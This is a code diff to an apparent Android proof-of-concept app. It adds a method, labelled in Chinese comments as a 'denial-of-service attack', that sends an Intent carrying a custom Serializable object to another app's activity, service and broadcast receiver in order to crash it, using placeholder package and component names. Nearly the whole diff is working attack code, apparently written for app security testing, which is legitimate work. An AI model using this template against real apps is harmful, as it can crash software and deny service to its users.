@@ -2,10 +2,13 @@ package com.example.android_app_src_poc;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
+
+import java.io.Serializable;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -49,5 +52,28 @@ public class MainActivity extends AppCompatActivity {
                 //sendBroadcast(v2);
             }
         });
+    }
+    //通用型拒绝服务阶段
+    static class SelfSerializableData implements Serializable{
+        private static final long serialVersionUID = 42L;
+        public SelfSerializableData() {
+            super();
+        }
+    }
+
+    //拒绝服务攻击
+    public void xx() {
+        Intent intent = new Intent();
+        intent.putExtra("serializable_key",new SelfSerializableData());
+
+        ComponentName componentName = new ComponentName("packagename","activityname");
+        intent.setComponent(componentName);
+        startActivity(intent);
+
+        startService(intent);
+
+        intent.setPackage("packagename");
+        intent.setAction("actionname");
+        sendBroadcast(intent);
     }
 }
